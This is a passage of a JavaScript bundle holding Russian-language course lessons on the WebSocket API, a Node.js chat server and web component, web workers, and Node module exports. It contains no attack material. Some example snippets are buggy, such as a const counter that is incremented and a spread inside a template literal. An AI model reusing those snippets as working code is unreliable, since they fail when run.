Object.assign(document.createElement('img'), {\n      src: messageObject.user.photo || 'https://i.cartoonnetwork.com/prismo/props/chars/ben17_180x180_0.png',\n      width: \"50\"\n    })\n\n    const userName = Object.assign(document.createElement('p'), {\n      innerText: messageObject.user.name\n    })\n\n    const data = Object.assign(document.createElement('div'), {\n      innerText: new Date().toLocaleString(),\n      className: 'small'\n    })\n\n    const message = Object.assign(document.createElement('span'), {\n      className: 'text',\n      innerText: messageObject.message\n    })\n\n    ;[ava, userName, data, message]\n      .forEach(elem => messageElement.appendChild(elem))\n    \n    \n    this.chatWindow.appendChild(messageElement)\n  }\n\n  resize () {\n    const rules = Array.from(this.css.sheet.cssRules)\n\n    rules.filter(rule => rule.selectorText === '.chat')[0]\n      .style.cssText = `\n        width: ${window.innerWidth - 20}px;\n        height: ${window.innerHeight - 120}px;\n        border: inset 1px;\n      `\n      rules.filter(rule => rule.selectorText === 'input')[0]\n        .style.width = `${window.innerWidth - 50}px`\n    }\n}\n\ncustomElements.define('chat-element', ChatElement)\n~~~\n\nВ компоненте есть метод ~resize()~, который будет вызываться при изменении размеров окна браузера\n\n^^Обратите внимание на \"слабое место\" компонента: он напрямую ссылается на переменную **~socket~** при отправке сообщения на сервер^^\n^^Т.е. если в главном скрипте мы назовем наше подключение к серверу иначе, то отправка сообщений работать не будет^^\n^^Подумайте, как избежать потенциальных ошибок в этом случае^^\n\nИ, наконец, главный скрипт, в котором устанавливается соединение с сервером:\n\n◘◘![ico-20 file] index.js◘◘\n\n~~~js\nconst socket = new WebSocket('ws://localhost:8080')\n\nconst chat = document.querySelector('chat-element')\n\nconst user = {\n  name: 'garevna',\n  photo: 'https://github.com/garevna/js-course/blob/master/images/my-photo.png?raw=true'\n}\n\nsocket.addEventListener('open', () => {\n  socket.send(JSON.stringify({\n    user: user,\n    message: 'Hello, do you listen to me ?'\n  }))\n})\n\nsocket.addEventListener('message', event => {\n  chat.reseiveMessage(event.data)\n})\n\nwindow.onresize = chat.resize.bind(chat)\n~~~\n\nТеперь все готово к запуску\n\n_________________________________________________________________________\n\n### ![ico-20 icon] Запуск чата\n\n![ico-20 bash] В первую очередь стартуем сервер:\n\n••$ node start.js••\n\nТеперь откроем в браузере файл **index.html**\n\nДублируем вкладку несколько раз - каждый раз к вебсокет-серверу подключается новый клиент\n\nМы видим на страницах открытых вкладок все сообщения, поступающие из разных вкладок\n\nиграйтесь в свое удовольствие ![ico-20 smile]\n\n_____________________________________________\n\n"},60193:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-70 webpack] WebSocket\n\n**WebSockets API** позволяет веб-приложениям использовать протокол ~WebSockets~ для двусторонней связи с удаленным хостом\n\n^^**~WebSockets~**, как и ~Local Storage~ и ~Geolocation~, изначально был частью спецификации HTML5^^\nCогласно спецификации протокола, соединение WebSocket стартует как HTTP-соединение, гарантируя полную обратную совместимость с миром до WebSocket\n\n__________________________________\n\nПереключение протокола с ~HTTP~ на ~WebSocket~ называется рукопожатием (handshake) ~WebSocket~\n\nПри отправке запроса на сервер браузер с помощью заголовков **~Connection~** и **~Upgrade~** сообщает, что он хочет переключиться с протокола ~HTTP~ на ~WebSocket~:\n\n^^^[Request Headers]\n\n~~~console\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,ru;q=0.8\nCache-Control: no-cache\nConnection: Upgrade\nHost: echo.websocket.org\nOrigin: null\nPragma: no-cache\nSec-WebSocket-Extensions: permessage-deflate; client_max_window_bits\nSec-WebSocket-Key: FWRPxaoGQhQaeqg1eRPHTw==\nSec-WebSocket-Version: 13\nUpgrade: websocket\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\n~~~\n\n^^^\n\nЕсли сервер поддерживает протокол ~WebSocket~, он соглашается на переключение протокола через те же заголовки **~Connection~** и **~Upgrade~**\n\n^^^[Response Headers]\n\n~~~console\nAccess-Control-Allow-Credentials: true\nAccess-Control-Allow-Headers: content-type\nAccess-Control-Allow-Headers: authorization\nAccess-Control-Allow-Headers: x-websocket-extensions\nAccess-Control-Allow-Headers: x-websocket-version\nAccess-Control-Allow-Headers: x-websocket-protocol\nAccess-Control-Allow-Origin: null\nConnection: Upgrade\nDate: Mon, 31 Dec 2018 19:53:07 GMT\nSec-WebSocket-Accept: OQbuqh0sOBKbPsVMFPKNpI75N8I=\nServer: Kaazing Gateway\nUpgrade: websocket\n~~~\n\n^^^\n\nВ этот момент HTTP-соединение разрывается и заменяется ~WebSocket~-соединением через то же TCP/IP\n\n~WebSocket~-соединение использует те же порты по умолчанию, что и HTTP (~80~) и HTTPS (~443~)\n\n_______________________________________________\n\n## ![ico-25 hw] Упражнение 1\n\n<img src=\"https://www.piesocket.com/img/logo.png\" height=\"40\"/>\n\nВоспользуемся готовым ~WebSocket~-сервером **~https://www.piesocket.com/~**, который возвращает назад сообщение, отправленное ему с клиента\n\nСовременные браузеры поддерживают протокол ~WebSocket~, поэтому создание объекта ~WebSocket~-соединения не представляет проблемы - это просто вызов конструктора\n\nСоздадим ~WebSocket~-соединение прямо в консоли браузера:\n\n~~~js\nconst apiKey = 'oCdCMcMPQpbvNjUIzqtvF1d2X2okWpDQj4AwARJuAgtjhzKxVEjQU6IdCjwm'\n\nconst websocket = new WebSocket(`wss://demo.piesocket.com/v3/channel_1?api_key=${apiKey}`)\n~~~\n\nПри вызове конструктора **_WebSocket_** необходимо передать ему обязательный аргумент ~протокол://домен:порт~\n\n\n• протокол может быть ~ws~ или ~wss~\n• домен будет ~demo.piesocket.com~ (точнее говоря, это субдомен demo домена piesocket.com)\n• порт мы оставляем на усмотрение сервера\n\nСозданный с помощью конструктора **WebSocket** экземпляр **_~websocket~_** \nимеет свойства ~onopen~, ~onmessage~, ~onclose~ и ~onerror~, \nа также методы ~send()~ и ~close()~, \nи всем этим арсеналом мы сейчас воспользуемся:\n\n~~~js\nconst apiKey = 'oCdCMcMPQpbvNjUIzqtvF1d2X2okWpDQj4AwARJuAgtjhzKxVEjQU6IdCjwm'\n\nconst websocket = new WebSocket(`wss://demo.piesocket.com/v3/channel_1?api_key=${apiKey}`)\n\nwebsocket.onopen = function (event) {\n  console.log('CONNECTED')\n  websocket.send('Happy New Year!')\n}\n\nwebsocket.onclose = function (event) {\n  console.log('DISCONNECTED')\n}\n\nwebsocket.onmessage = function (event) {\n  console.log(event.data)\n  websocket.close()\n}\n\nwebsocket.onerror = function (event) {\n  console.error(`ERROR: ${event.data}`)\n}\n~~~\n\n◘◘^^Результат в консоли^^◘◘\n\n~~~console\nCONNECTED\nHappy New Year!\nDISCONNECTED\n~~~\n\n![](https://kaazing.com/favicon.ico)\n\n______________________________________________________________________________________\n\n## ![ico-25 hw] Упражнение 2\n\n\nДля получения некоторого экспириенса с веб-сокетами нам придется познакомиться с серверным JS\n\nНе забудьте создать отдельную папку для наших экспериментов и перейти в нее\n\nИтак, платформа **Node.js** станет основой нашего приложения\n\nВ **Node.js** нет встроенной поддержки ~WebSocket~, поэтому установим плагин **~ws~**\n\n### ![ico-20 bash] Установка\n\n\n••$ npm install ws••\n\n\nТеперь создадим вебсокет-сервер \n\nДля этого нам нужен **серверный** скрипт\n\nСоздадим файл ![ico-20 file] **_start.js_**\n\nВ **Node.js** все файлы, включаемые в приложение - это отдельные модули\n\nЧтобы подключить модуль к исполняемому скрипту, необходимо использовать функцию **_~require~_**\n\nНам нужно подключить модуль **~ws~**, который мы уже установили:\n\n~~~js\nconst socket = require('ws')\n~~~\n\nТеперь этот модуль доступен нам под именем **_socket_**\n\nС его помощью мы и создадим ~WebSocket~ сервер на порту ~8080~\n\n◘◘server◘◘\n\n~~~js\nconst server = new WebSocket\n  .Server({\n    port: 8080\n  })\n~~~\n\nТеперь в переменной **_server_** у нас ссылка на объект **_WebSocket_**-сервера\n\nИспользуя событие ~connection~ **_WebSocket_**-сервера,\n\nсоздадим обработчика события ~message~ объекта **_socket_**\n\nОбработчик будет отсылать в ответ на полученное сообщение JSON-строку\n\nс именем отправителя \"server\" и текстом \"I listen to you\",\n\nа затем выводить в консоль полученное от клиента сообщение:\n\n~~~js\nserver.on('connection', socket => {\n  socket.on('message', received => {\n    socket.send(JSON.stringify({\n      name: 'server',\n      message: 'I listen to you'\n    }))\n\n    const mess = JSON.parse(received)\n    console.log(`received from a client: ${mess.user.name} ${mess.message}`)\n  })\n})\n~~~\n\nИтак, серверный скрипт готов, сохраним его в файл **start.js**\n\n◘◘![ico-20 file] start.js◘◘\n\n~~~js\nconst WebSocket = require('ws')\n\nconst server = new WebSocket\n  .Server({\n    port: 8080\n  })\n\nserver.on('connection', socket => {\n  socket.on('message', received => {\n    socket.send(JSON.stringify ( {\n      name: 'server',\n      message: 'I listen to you'\n    }))\n\n    const mess = JSON.parse(received)\n    console.log(`received from a client: ${mess.name} ${mess.message}`)\n  })\n})\n~~~\n\nи запустим с помощью консольной команды:\n\n•• ![ico-20 bash] $ node start.js••\n\n\nТеперь откроем новую вкладку и введем в адресной строке браузера:\n\n**~http://localhost:8080/~**\n\nНа странице появится сообщение _~Upgrade Required~_\n\nЭто потому, что мы указали протокол ~http~, а запущенный нами на порту ~8080~ сервер работает по протоколу ~ws~\n\nВ консоли этой вкладки введем \"клиентский\" код:\n\n~~~js\nconst socket = new WebSocket('ws://localhost:8080')\n\nsocket.addEventListener('open', () => {\n  socket.send(JSON.stringify({\n    name: 'Admin',\n    message: 'Hello, do you listen to me ?'\n  }))\n})\n\nsocket.addEventListener('message', event => console.log(JSON.parse(event.data)))\n~~~\n\nпоскольку мы создаем сервер на локальной машине, \n\nдомен будет ~localhost~ или ~127.0.0.1~\n\nпорт мы уже выбрали - ~8080~\n\nПосле выполнения кода:\n\n~~~js\nconst socket = new WebSocket('ws://localhost:8080')\n~~~\n\nв переменной **_~socket~_** у нас будет ссылка на экземпляр ~WebSocket~-соединения, \nу которого есть событие **~open~** и метод **~send~** \n\n^^(как видим, события и методы на стороне сервера и клиента одни и те же, поскольку это соединение двух \"равноправных\" партнеров для обмена сообщениями)^^\n\nИтак, когда соединение будет открыто, клиент \n(пока из консоли браузера) \nотправит на сервер сообщение - JSON-строку \n\nс именем отправителя \"_Admin_\" и текстом \"_Hello, do you listen to me ?_\"\n\n◘◘^^![ico-20 bash] Результат в консоли^^◘◘\n~~~console\n$ node start.js\nreceived from a client:\n                Admin\n                Hello, do you listen to me ?\n~~~\n\n◘◘^^Результат в консоли браузера^^◘◘\n\n~~~console\n▼ { name: \"server\", message: \"I listen to you\" }\n    message: \"I listen to you\"\n    name: \"server\"\n  ► __proto__: Object\n~~~\n\n______________________________________________________________________________________\n\n## ![ico-25 hw] Упражнение 3\n\nСоздадим простенький чат\n\n### ![ico-20 ico] Серверная часть\n\nТеперь серверный скрипт будет немного сложнее, поэтому углубимся в **Node.js**\n\n![ico-70 node] \n\nПервое, с чем мы познакомимся в **Node.js** - это модуль [**~fs~**](https://nodejs.org/api/fs.html) \n^^(**~File System~**)^^\n\nДля подключения модуля **~fs~** нужно использовать функцию ~require~:\n\n~~~js\nconst fs = require('fs')\n~~~\n\nС помощью модуля ~fs~ мы будем читать (а можно и писать) файлы на сервере\n\nДавайте сначала создадим такие файлы\n\n^^^[users.json]\n\n~~~json\n[\n  {\n    \"name\": \"Иван\",\n    \"photo\": \"https://apollo-ireland.akamaized.net/v1/files/5bucx1wiqmes-UA/image;s=644x461\"\n  },\n  {\n    \"name\": \"Ольга\",\n    \"photo\": \"https://orig00.deviantart.net/ecd9/f/2015/050/9/3/gravity_falls_icon__wendy_by_mikeinel-d8iowct.gif\"\n  },\n  {\n    \"name\": \"Демьян\",\n    \"photo\": \"https://leoterra.com/sites/default/files/clAvHWVG4GE.jpg\"\n  },\n  {\n    \"name\": \"Денис\",\n    \"photo\": \"https://avatars.mds.yandex.net/get-pdb/1058492/c606d11d-e4fb-4d5b-9de6-84e590c34f8b/s1200\"\n  },\n  {\n    \"name\": \"Вероника\",\n    \"photo\": \"https://super.urok-ua.com/wp-content/uploads/2017/04/Avatarka-11-2.jpg\"\n  }\n]\n~~~\n\n^^^\n\n^^^[messages.json]\n\n~~~json\n[\n  \"Привет!\",\n  \"Пойдем в кино ?\",\n  \"Кто сделал домашку ?\",\n  \"У меня проблемы с промисами... :(\",\n  \"Кто вчера был на конфе ? Поделитесь впечатлениями\",\n  \"Я повторяю веб-компоненты - совсем опух...\",\n  \"Похоже, гитлаб опять лег...\",\n  \"Кто уже закачал проект на гит ?\",\n  \"Я спал вчера 2 часа\",\n  \"А я начинаю понимать промисы :)\",\n  \"Вот бы недельку передышки, чтобы только пилить код :)\",\n  \"Меня посылают в командировку, похоже, не попаду на защиту :(\",\n  \"Кто завтра идет на коворкинг ? Встречаемся ?\",\n  \"Отослал резюме на джуна, жду ответа\",\n  \"Завтра у меня собес, пожелайте мне ни пуха\",\n  \"Кто чем планирует заниматься на праздники ?\",\n  \"Мне достался такой жуткий проект по верстке, что я в осадке...\",\n  \"Не очень получается отцентровать иконки соцсетей в окружностях\",\n  \"Я респонсив замутил уже, правда только до 1024рх\"\n]\n~~~\n\n^^^\n\nОбъявим два пустых массива\n\n~~~js\nconst users = []\nconst messages = []\n~~~\n\nв которые мы будем помещать данные из файлов **users.json** и **messages.json**\n\nТеперь воспользуемся методом **_~readFile()~_** модуля **~fs~** для чтения этих файлов\n\n~~~js\nfs.readFile('users.json', 'utf8', (err, content) => users = JSON.parse(content))\n\nfs.readFile('messages.json', 'utf8', (err, content) => messages = JSON.parse(content))\n~~~\n\nЭтот метод принимает три аргумента:\n\n• имя файла (и путь к файлу, если он расположен не в корневой папке)\n• кодировка\n• коллбэк-функция, которая будет вызвана, когда файл будет прочитан, и ей будет передано два аргумента:\n..... сообщение об ошибке, если чтение файла завершится неудачей\n..... содержимое файла в противном случае\n\nПрочитанное содержимое мы помещаем в ранее объявленные массивы **_users_** и **_messages_**\n\nДалее мы создаем вебсокет-сервер, как мы это уже делали в предыдущем упражнении\n\n~~~js\nconst WebSocket = require('ws')\nconst server = new WebSocket.Server({ port: 8080 })\n~~~\n\nТеперь нужно познакомиться поближе с вебсокет-сервером\n\nКаждый раз, когда происходит подключение нового клиента к вебсокет-серверу, происходит событие **~connection~**\n\nМы устанавливаем обработчика события ~connection~\n\nЭтот event handler получает в качестве аргумента экземпляр нового соединения\n\n~~~js\nserver.on('connection', client => {\n  ...\n}\n~~~\n\nЭтот экземпляр (_client_) попадает в итерабельный объект **~server.clients~** (экземпляр класса ~Set~)\n\nОт своего конструктора (~Set~) **~server.clients~** наследует методы:\n\n| add     | forEach |\n| delete  | clear   |\n| has     | entries |\n| keys    | values  |\n\nМы воспользуемся методом ~forEach~, чтобы сделать рассылку каждого нового сообщения всем подключенным клиентам\n\n~~~js\nserver.on('connection', client => {\n  client.on('message', received => {\n    server\n      .clients\n      .forEach(client => client.send(received))\n  })\n}\n~~~\n\nДля более оживленного чата при каждом поступлении на сервер сообщения от клиента добавим отправку всем клиентам случайно выбранного сообщения из массива **_messages_** от случайно выбранного клиента  из массива **_users_**\n\n~~~js\nserver.on('connection', client => {\n  client.on('message', received => {\n    server.clients.forEach(client => client.send(received))\n    const newMessage = {\n      user: users[randomValue(users.length - 1)],\n      message: messages[randomValue(messages.length - 1)]\n    }\n    server.clients.forEach(client => client.send(JSON.stringify(newMessage)))\n  })\n}\n~~~\n\nгде **~randomValue~** - функция:\n\n~~~js\nconst randomValue = num => Math.round(Math.random() * num)\n~~~\n\nИтак, серверный скрипт полностью готов:\n\n^^^[start.js]\n\n~~~js\nconst fs = require('fs')\n\nconst users = []\nconst messages = []\n\nfs.readFile('users.json', 'utf8', (err, content) => users.push(...JSON.parse(content)))\n\nfs.readFile('messages.json', 'utf8', (err, content) => messages.push(...JSON.parse(content)))\n\nconst WebSocket = require('ws')\n\nconst server = new WebSocket.Server({ port: 8080 })\n\nserver.on('connection', client => {\n  client.on('message', received => {\n    server.clients.forEach(_client => _client.send(received))\n    const newMessage = {\n      user: users[randomValue(users.length - 1)],\n      message: messages[randomValue(messages.length - 1)]\n    }\n    server.clients.forEach(_client => _client.send(JSON.stringify(newMessage)))\n  })\n})\n\nconst randomValue = num => Math.round(Math.random() * num)\n~~~\n\n^^^\n\n______________________________________________________________\n\n### ![ico-20 ico] Клиентская часть\n\n◘◘![ico-20 file] index.html◘◘\n\n~~~html\n&lt;!DOCTYPE html>\n&lt;html lang=\"ru\">\n  &lt;head>\n    &lt;meta charset=\"UTF-8\">\n    &lt;title>Websocket&lt;/title>\n  &lt;/head>\n\n  &lt;body>\n    &lt;chat-element\n        username=\"user\"\n        photo=\"https://i.pinimg.com/originals/0c/a9/e2/0ca9e28dcb12dc698cfd2beda6d6fa64.jpg\">\n    &lt;/chat-element>\n    &lt;script src = \"./chat.js\">&lt;/script>\n    &lt;script src = \"./index.js\">&lt;/script>\n  &lt;/body>\n\n&lt;/html>\n~~~\n\nКак можно увидеть из кода разметки, мы подключаем два файла скриптов (chat.js и index.js), которые должны находиться в корневой папке приложения\n\nКроме того, в разметке присутствует веб-компонент ~&lt;chat-element>~ с атрибутами **_~username~_** и **_~photo~_**, значения которых вы можете изменить по своему усмотрению\n\nТеперь создадим веб-компонент ~&lt;chat-element>~\n\n◘◘![ico-20 file] chat.js◘◘\n\n~~~js\nclass ChatElement extends HTMLElement {\n  constructor () {\n    super ()\n\n    this.name = this.getAttribute('username') || 'admin'\n    this.photo = this.getAttribute('photo') || 'http://hypeava.ru/uploads/posts/2018-03/1522076645_4.jpg'\n\n    const shadow = this.attachShadow({ mode: 'open' })\n\n    this.chatWindow = Object.assign(document.createElement('div'), {\n      className: 'chat'\n    })\n\n    const input = Object.assign(document.createElement('input'), {\n      innerText: 'Send message',\n      onchange: this.sendMessage.bind(this)\n    })\n\n    this.css = Object.assign(document.createElement('style'), {\n      textContent: `\n        * {\n          font-family: monospace, Arial;\n        }\n        .chat {\n          width: ${window.innerWidth - 20}px;\n          height: ${window.innerHeight - 120}px;\n          border: inset 1px;\n        }\n        input {\n          width: ${window.innerWidth - 50}px;\n          border: inset 1px;\n          background-color: #ded;\n          box-shadow: inset 3px 3px 5px #00000090;\n          padding: 8px 14px;\n          outline: none;\n        }\n        p, img, .small, .text {\n          margin: 4px 8px;\n        }\n        p {\n          font-weight: bold;\n          color: green;\n        }\n        .small {\n          font-size:10px;\n        }\n      `\n    })\n\n    shadow.appendChild(this.css)\n    shadow.appendChild(this.chatWindow)\n    shadow.appendChild(input)\n  }\n\n  sendMessage (event) {\n    const mess = {\n      user: {\n        name: this.name,\n        photo: this.photo\n      },\n      message: event.target.value\n    }\n    socket.send(JSON.stringify(mess))\n  }\n  \n  reseiveMessage (mess) {\n    const messageObject = JSON.parse(mess)\n\n    const messageElement = document.createElement('div')\n  \n    const ava = Object.assign(document.createElement('img'), {\n      src: messageObject.user.photo || 'https://i.cartoonnetwork.com/prismo/props/chars/ben17_180x180_0.png',\n      width: \"50\"\n    })\n\n    const userName = Object.assign(document.createElement('p'), {\n      innerText: messageObject.user.name\n    })\n\n    const data = Object.assign(document.createElement('div'), {\n      innerText: new Date().toLocaleString(),\n      className: 'small'\n    })\n\n    const message = Object.assign(document.createElement('span'), {\n      className: 'text',\n      innerText: messageObject.message\n    })\n\n    ;[ava, userName, data, message]\n      .forEach(elem => messageElement.appendChild(elem))\n    \n    \n    this.chatWindow.appendChild(messageElement)\n  }\n\n  resize () {\n    const rules = Array.from(this.css.sheet.cssRules)\n\n    rules.filter(rule => rule.selectorText === '.chat')[0]\n      .style.cssText = `\n        width: ${window.innerWidth - 20}px;\n        height: ${window.innerHeight - 120}px;\n        border: inset 1px;\n      `\n      rules.filter(rule => rule.selectorText === 'input')[0]\n        .style.width = `${window.innerWidth - 50}px`\n    }\n}\n\ncustomElements.define('chat-element', ChatElement)\n~~~\n\nВ компоненте есть метод ~resize()~, который будет вызываться при изменении размеров окна браузера\n\n> Обратите внимание на \"слабое место\" компонента: он напрямую ссылается на переменную **~socket~** при отправке сообщения на сервер\n\n> Т.е. если в главном скрипте мы назовем наше подключение к серверу иначе, то отправка сообщений работать не будет\n\n> Подумайте, как избежать потенциальных ошибок в этом случае\n\nИ, наконец, главный скрипт, в котором устанавливается соединение с сервером:\n\n◘◘![ico-20 file] index.js◘◘\n  \n~~~js\nconst socket = new WebSocket('ws://localhost:8080')\n\nconst chat = document.querySelector('chat-element')\n\nconst user = {\n  name: 'garevna',\n  photo: 'https://github.com/garevna/js-course/blob/master/images/my-photo.png?raw=true'\n}\n\nsocket.addEventListener('open', () => {\n  socket.send(JSON.stringify({\n    user: user,\n    message: 'Hello, do you listen to me ?'\n  }))\n})\n\nsocket.addEventListener('message', event => {\n  chat.reseiveMessage(event.data)\n})\n\nwindow.onresize = chat.resize.bind(chat)\n~~~\n\nТеперь все готово к запуску\n\n___________________________\n\n![ico-20 icon] **Запуск чата**\n\nВ первую очередь стартуем сервер:\n\n••![ico-20 bash] $ node start.js••\n\n\nТеперь откроем в браузере файл **index.html**\n\nДублируем вкладку несколько раз - каждый раз к вебсокет-серверу подключается новый клиент\n\nМы видим на страницах открытых вкладок все сообщения, поступающие из разных вкладок\n\nиграйтесь в свое удовольствие ![ico-20 smile]\n"},62644:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Web-workers\n\nФоновые ( параллельные ) потоки в JS эмулируются с помощью worker-ов\n\nКак создать worker-а ?\n\nКак всегда - с помощью конструктора ![ico-20 wink]\n\n~~~js\nconst worker = new Worker('worker.js')\n~~~\n\nОбратите внимание, что конструктору **Worker** мы передаем ссылку на файл скрипта\nСкрипт, находящийся в упомянутом файле, и будет запущен параллельно с основным потомком\n\nПоскольку код **worker**-а работает параллельно с основным потоком, он не имеет доступа к DOM\nстраница ему недоступна...\nоднако он может выводить сообщения в консоль\n\nИ еще он может взаимодействовать с основным потоком, из которого был запущен\n\nЧтобы понять, как он это делает, давайте заглянем в прототип его конструктора\n\n~~~console\n▼ ƒ Worker()\n    arguments: null\n    caller: null\n    length: 1\n    name: \"Worker\"\n  ▼ prototype: Worker\n      ► onerror: (...)\n      ► onmessage: (...)\n      ► postMessage: ƒ postMessage()\n      ► terminate: ƒ terminate()\n      ► constructor: ƒ Worker()\n        Symbol(Symbol.toStringTag): \"Worker\"\n      ► get onerror: ƒ onerror()\n      ► set onerror: ƒ onerror()\n      ► get onmessage: ƒ onmessage()\n      ► set onmessage: ƒ onmessage()\n      ► __proto__: EventTarget\n  ► __proto__: ƒ EventTarget()\n[[Scopes]]: Scopes[0]\n~~~\n\nТак-с, в нашем (точнее, **worker**-а) распоряжении унаследованные методы **postMessage** и **terminate** (вполне \"говорящие\" названия)\nа также свойства **onmessage** и **onerror**\n\nТак что все предельно просто:\n\n__________________________________________\n\n## ![ico-25 icon] onmessage\n\n• в коде **worker**-а нужно установить обработчика события **_message_**, который будет срабатывать при получении сообщений от главного скрипта\nкак и все обработчики событий, он получает объект события\nу этого события будет свойство **data**, которое и будет содержать присланное основным скриптом сообщение\n\n◘◘worker.js◘◘\n~~~js\nonmessage = async function (event) {\n  console.log(event.data)\n}\n~~~\n\n## ![ico-25 icon] postMessage\n\n• можно отправить сообщение из **worker**-а скрипту в основном потоке (который запустил **worker**-а)\n\n◘◘worker.js◘◘\n~~~js\npostMessage('message from worker to script')\n~~~\n\n• можно отправить сообщение из основного потока **worker**-у\n\n◘◘script.js◘◘\n~~~js\nworker.postMessage('message from script to worker')\n~~~\n\n______________________________________________________________\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nconst worker = new Worker('src/web-worker.js')\n\nworker.onmessage = function (event) {\n  document.body\n    .appendChild(document.createElement('p'))\n    .innerText = `Message from worker: ${event.data}`\n}\n\nconst button = document.body\n  .appendChild(document.createElement('button'))\n\nbutton.innerText = 'Send message'\nbutton.counter = (function () {\n  const count = 'A'.charCodeAt(0) - 1\n  return () => String.fromCharCode(++count)\n})()\n\nbutton.onclick = function ( event ) {\n  worker.postMessage(event.target.counter())\n}\n~~~\n\n◘◘worker.js◘◘\n~~~js\nconst messages = []\n\nonmessage = async function( event ) {\n  postMessage('Worker has received a message from main script')\n  messages.push(event.data)\n  postMessage(`Worker's messages collection: ${...messages}`)\n}\n~~~\n\nОбратите внимание на очень важный факт:\n![ico-20 warn] Мы посылаем **worker**-у массив, а не строку\n^^т.е. при обмене данными с **worker**-ом с помощью **postMessage** нам не нужно использовать метод **JSON.stringify**^^\n^^поскольку данные циркулируют внутри браузера, а не пересылаются по _http_^^\n\n{{{web-worker-sample-1.js}}}\n__________________________________________\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nconst p = document.body.appendChild(document.createElement('p'))\n\nconst worker = new Worker('src/web-worker.js')\n\nworker.onmessage = function (event) {\n  p.innerHTML = event.data\n}\n\nsection.appendChild(document.createElement('input'))\n  .oninput = function (event) {\n    worker.postMessage(event.target.value)\n  }\n~~~\n\n◘◘web-worker.js◘◘\n~~~js\nconst getHex = () => (Math.max(120, Math.round(Math.random() * 255))).toString(16)\n\nconst getColor = () => '#' + getHex() + getHex() + getHex()\n\nconst colorMessage = message => message.split('')\n  .map(letter => `<span style=\"color:${getColor()}\">${letter}</span>`)\n  .join('')\n\nonmessage = function (event) {\n  postMessage(colorMessage(event.data))\n}\n~~~\n\n{{{web-worker-sample-2.js}}}\n___________________________________________________\n\n## ![ico-25 icon] importScripts\n\nМетод importScripts позволяет импортировать скрипты в тело worker-а\n\nВ следующем примере оставим основной скрипт без изменений,\nизменим только код worker-а:\n\n◘◘![ico-25 cap] ** 3**◘◘\n~~~js\nself.importScripts('https://cdn.rawgit.com/chrisveness/crypto/4e93a4d/sha256.js')\n\nonmessage = function (event) {\n  postMessage(Sha256.hash(event.data))\n}\n~~~\n\nworker импортирует скрипт Sha256, который и использует для генерации дайджеста полученного сообщения\nсгенерированный дайджест отправляется назад основному скрипту\n\n{{{web-worker-sample-3.js}}}\n___________________________________________________\n\n## ![ico-25 icon] MessageChannel\n\n◘◘![ico-25 cap] ** 4**◘◘\n\n~~~js\nconst section = document.body\n\nfunction structuralClone(obj) {\n  return new Promise(resolve => {\n    const { port1, port2 } = new MessageChannel()\n    port2.onmessage = event => resolve(event.data)\n    port1.postMessage(obj)\n  })\n}\n\nconst user = {\n  name: 'Ivan',\n  family: {\n    mother: {\n      name: 'Mary',\n      age: 41,\n      speciality: 'developer'\n    },\n    father: {\n      name: 'Stephan',\n      age: 43,\n      speciality: 'engineer'\n    },\n    brother: {\n      name: 'Jeck',\n      age: 16,\n      speciality: 'student'\n    }\n  }\n}\nstructuralClone(user)\n  .then(response => section.innerText = JSON.stringify(response))\n\n~~~\n\n{{{web-workers-clone.js}}}\n"},72416:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-70 node] module.exports & require()\n\nВ  **Node.js** собственная система модулей\n\nВсе скрипты в **Node.js** должны быть **модулями**\n\n## ![ico-25 icon] Создание модулей\n\nЧтобы сделать скрипт модулем, его, как мы уже знаем, нужно **экспортировать**\n\nДля этого в **Node.js** есть объект **~module~**, у которого есть метод ![ico-20 require] **_~exports~_**\n\n_________________________________________\n\n![ico-20 cap] **Пример 1**\n\n◘◘![ico-20 file] script.js◘◘\n\n~~~js\nmodule.exports = {\n  hello: function () {\n    console.log(\'Привет, будущие девелоперы!\')\n  },\n\n  message: function (mess) { console.log(mess) }\n}\n~~~\n\n^^В этом примере мы экспортировали две функции: **hello** и **message**^^\n^^Они находятся в модуле **script.js**^^\n^^Теперь мы можем использовать эти функции, если подключим модуль **script.js**^^\n\n_____________________________________\n\n## ![ico-25 icon] Подключение модулей\n\nМодули можно подключать по мере необходимости\n\nДля подключения модуля используется функция **~require()~**\n\n^^То есть в результате вызова **~require( "script.js" )~** мы будем получать объект **~module.exports~** из файла ~script.js~^^\n\n^^Создадим файл **start.js**^^\n^^В файле **start.js** подключим модуль **script.js** как **~lib~**^^\n^^и вызовем функции ~hello~ и ~message~:^^\n\n◘◘![ico-20 file] start.js◘◘\n\n~~~js\nconst lib = require(\'./script.js\')\n\nlib.hello()\nlib.message(\'Вы еще не знакомы с Node.js ?\')\n~~~\n\n^^Добавим в файл ~package.json~ алиас **start** для запуска серверного скрипта ~start.js~:^^\n\n◘◘![ico-20 file] package.json◘◘\n\n~~~json\n{\n  "name": "test",\n  "version": "1.0.0",\n  "description": "test",\n  "main": "start.js",\n  "scripts": {\n      "start": "node start.js",\n      "dev": "webpack --mode development  --watch",\n      "build": "webpack --mode production  --watch"\n  },\n  "keywords": [ "npm", "Node.js", "node", "webpack" ],\n  "author": "...",\n  "license": "MIT"\n}\n\n~~~\n\n^^Запустим теперь команду:^^\n\n••![ico-20 bash] npm run start••\n\n^^Можно и сразу в консоли набрать команду:^^\n\n••![ico-20 bash] node start.js••\n\n**Результат:**\n\n••npm-test@1.0.0 start Z:\\home\\npm-test<br>node start.js<br><br>Привет, будущие девелоперы!<br>Вы еще не знакомы с Node.js ?••\n\n_______________________________________________________________________________\n\n^^Если в  файле ![ico-20 file] ~sourse.js~ определено свойство **~module.exports~**, ^^\n^^в любом другом файле  (например, ![ico-20 file] ~sample.js~) ^^\n^^можно вызвать функцию  **_~require~_** и передать ей в качестве аргумента имя файла ("sourse.js")^^\n\n^^Результатом работы функции  **_~require~_** будет объект, ссылку на который мы поместили в **~module.exports~** в файле ![ico-20 file] ~sample.js~^^\n\n_______________________________________________________________________________\n\n# ![ico-30 webpack] webpack.config.js\n\nСкрипт с инструкциями и настройками для процесса сборки приложения\n\n_______________________________________________\n\nСоздадим файл  **~webpack.config.js~**  в корневой папке нашего приложения\n\nЭто 